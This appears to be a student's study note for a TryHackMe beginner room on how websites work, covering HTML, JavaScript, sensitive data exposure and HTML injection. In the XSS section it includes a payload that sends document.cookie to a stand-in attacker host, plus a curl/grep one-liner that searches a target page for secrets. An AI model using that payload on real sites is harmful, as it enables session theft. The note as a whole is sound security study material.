---
tags:
  - THM
  - pre-security
  - web
  - HTML
  - JavaScript
  - room
platform: TryHackMe
type: room
module: "How The Web Works"
module_number: 3
room_number: 11
status: "⬜"
url: https://tryhackme.com/room/howwebsiteswork
difficulty: Easy
---

# 🖥️ How Websites Work

> [!abstract] Summary
> Learn how websites are built and served — covering HTML, JavaScript, and basic client-side vulnerabilities like Sensitive Data Exposure and HTML Injection.

**Path:** [[Pre Security (New)]] > [[How The Web Works]] > How Websites Work

---

## 🎯 Learning Objectives
- Understand how websites are created (HTML, CSS, JavaScript)
- Learn the difference between front-end and back-end
- Identify Sensitive Data Exposure vulnerabilities
- Understand HTML Injection

---

## 📖 Key Concepts

### Front-End vs Back-End

| | Front-End | Back-End |
|---|---|---|
| **Runs on** | User's browser | Server |
| **Languages** | HTML, CSS, JavaScript | Python, PHP, Node.js, Ruby |
| **Visible to user** | Yes (View Source) | No |
| **Examples** | Page layout, animations | Database queries, authentication |

---

### HTML (HyperText Markup Language)
HTML defines the **structure and content** of a webpage using tags.

```html
<!DOCTYPE html>
<html>
  <head>
    <title>My Page</title>
  </head>
  <body>
    <h1>Hello World</h1>
    <p>This is a paragraph.</p>
    <a href="https://tryhackme.com">Click here</a>
    <img src="image.jpg" alt="An image">
    <!-- This is a comment — visible in source! -->
  </body>
</html>
```

> [!warning] Security Note
> HTML comments (`<!-- -->`) and hidden form fields are visible in **View Source**. Developers sometimes accidentally leave sensitive info (API keys, passwords, internal paths) in comments.

**Common HTML elements:**
| Tag | Description |
|-----|-------------|
| `<h1>–<h6>` | Headings |
| `<p>` | Paragraph |
| `<a href="">` | Hyperlink |
| `<form>` | Input form |
| `<input>` | Form field |
| `<button>` | Clickable button |
| `<div>`, `<span>` | Layout containers |
| `<!-- -->` | Comment |

---

### JavaScript
JavaScript adds **interactivity and dynamic behavior** to web pages. It runs in the browser (client-side).

```javascript
// Alert popup
alert("Hello!");

// Modify page content
document.getElementById("demo").innerHTML = "Changed!";

// Make an API call
fetch("/api/user")
  .then(response => response.json())
  .then(data => console.log(data));
```

> [!warning] Security Note
> JavaScript is visible to users in browser DevTools. Sensitive logic (auth checks, API keys) should **never** be in client-side JavaScript.

---

### Sensitive Data Exposure
Occurs when websites accidentally expose sensitive information in:
- **HTML source code** (comments, hidden fields)
- **JavaScript files** (hardcoded API keys, passwords)
- **URL parameters** (e.g., `?user=admin&token=secret`)
- **Error messages** (stack traces revealing server info)

**How to find it:**
- Right-click → **View Page Source** (`Ctrl+U`)
- Browser **DevTools** → Sources tab
- Check JS files for hardcoded credentials

```bash
# Common recon — look at page source
curl -s http://target.com | grep -i "password\|secret\|key\|token"
```

---

### HTML Injection
If a website displays user input without sanitizing it, an attacker can inject HTML tags that get rendered in other users' browsers.

**Example:**
- Input field asks for your name
- Attacker enters: `<h1>Hacked!</h1>`
- If not sanitized, this renders as a heading on the page

**Escalation — XSS (Cross-Site Scripting):**
```html
<script>alert('XSS')</script>
<img src=x onerror="document.location='http://attacker.com/steal?c='+document.cookie">
```

> [!warning] HTML Injection → XSS is one of the most common web vulnerabilities (OWASP Top 10).

**Prevention:** Always **sanitize** and **encode** user input before displaying it.

---

## 🛠️ Browser Tools

```
Ctrl+U           → View page source
F12 / Ctrl+Shift+I → Open DevTools
  - Elements tab  → Inspect HTML/CSS
  - Console tab   → Run JavaScript
  - Network tab   → See HTTP requests
  - Sources tab   → Browse JS files
  - Storage tab   → View cookies, localStorage
```

---

## 🔑 Key Takeaways
- Websites are built with HTML (structure), CSS (style), and JavaScript (behavior)
- Front-end code is **always visible** to users — never put secrets there
- Sensitive Data Exposure = accidentally leaking secrets in source, JS, or errors
- HTML Injection can escalate to XSS if JavaScript execution is possible

---

## 🔗 Related Notes
- [[10 - HTTP in Detail]] — how the server sends HTML to the browser
- [[12 - Putting It All Together]] — complete web request picture
- [[HTML]] · [[JavaScript]] · [[XSS]] · [[Sensitive Data Exposure]] · [[HTML Injection]]
